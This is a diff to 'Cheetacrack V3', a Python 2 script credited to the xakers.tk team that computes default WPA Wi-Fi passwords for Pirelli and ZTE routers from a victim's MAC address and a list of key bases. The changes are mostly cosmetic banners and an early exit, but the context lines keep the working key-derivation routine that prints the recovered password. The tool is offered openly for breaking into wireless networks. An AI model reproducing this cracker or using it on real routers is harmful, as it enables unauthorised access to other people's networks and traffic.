@@ -11,18 +11,29 @@
 import sys
 import fileinput
 
-def stampa():
-   print "*************************************************"
-   print "*                                               *" 
-   print "*     Cheetacrack python script                 *"
-   print "*     for Pirelli and ZTE routers               *"
-   print "*     by xakers.tk team                         *"
-   print "*                                               *"
-   print "*************************************************"
+
+
+def help():
    print ""
-   print "usage: python cheetacrack.py <mac_addres> <file_input> "
    print ""
-   print "Example: python cheetacrack.py 38:22:9D:A3:00:00 bases.lst"
+   print ""
+   print "          *************************************************"
+   print "          *                                               *"
+   print "          *     Cheetacrack python script V3              *"
+   print "          *     for Pirelli and ZTE routers               *"
+   print "          *     by xakers.tk team                         *"
+   print "          *                                               *"
+   print "          *************************************************"
+   print ""
+   print ""
+   print ""
+   print ""
+   print "usage: python cheetacrackV3.py <mac_addres> <file_input> "
+   print ""
+   print "Example: python cheetacrackV3.py 38:22:9D:A3:00:00 bases.lst"
+   print ""
+   print ""
+   print ""
    print ""
 
 if(len(sys.argv)>2):
@@ -39,8 +50,9 @@ if(len(sys.argv)>2):
          base=line[38:44]
          inc=line[45]
          testimacl6=mac_addr[9:17]
-         if(filemacf6==inputmacf6 and filemacfl6<=inputmacl6<=filemacll6):   
-            esito=bool(1)
+         jojogps=bool(0)
+         if(filemacf6==inputmacf6 and filemacfl6<=inputmacl6<=filemacll6):
+            jojogps=bool(1)
             testimacl6=testimacl6.replace(':','')
             sn1=sn1.replace(' ','')  
             testimacl6=int(testimacl6,16)
@@ -55,20 +67,42 @@ if(len(sys.argv)>2):
             while(i<zeros):   
                ris="0"+ris
                i=i+1
-            
-            print "*********************************"
-            print "* Key found:         *"
-            print "* MAC =",mac_addr,"   *"
-            print "* WPA =",sn1+""+ris,"      *"
-            print "*            *"
-            print "*********************************"
-         
+            print ""
+            print ""
+            print ""
+            print "      checking if script works...",jojogps
+            print "##########################################"
+            print "##########################################"
+            print "##   Key found!!!                       ##"
+            print "##   working MAC =",mac_addr,"   ##"
+            print "##   WPA wifi password =",sn1+""+ris," ##"
+            print "##########################################"
+            print "############################### jojoGPS ##"
+            print ""
+            print ""
+            print ""
+            sys.exit()
    except IOError:
       print "No such file"
       sys.exit()   
-   if(not(esito)):   
-      print "Mac is not on the list"
+   if(not(jojogps)):
+      print ""
+      print ""
+      print ""
+      print ""
+      print ""
+      print "Finally Result:",jojogps
+      print "ERROR while working for this MAC: ",mac_addr
+      print "Problem in file bases.lst Mac is not on the list!!!!!!!"
+      print ""
+      print " ###################################"
+      print " #  THIS MAC IS NOT IN THE LIST!!  #"
+      print " ###################################"
+      print ""
+      print "help us find this MAC at www.xakers.tk team"
+      print ""
+      print ""
       sys.exit()
 
 else:
-   stampa()
+   help()
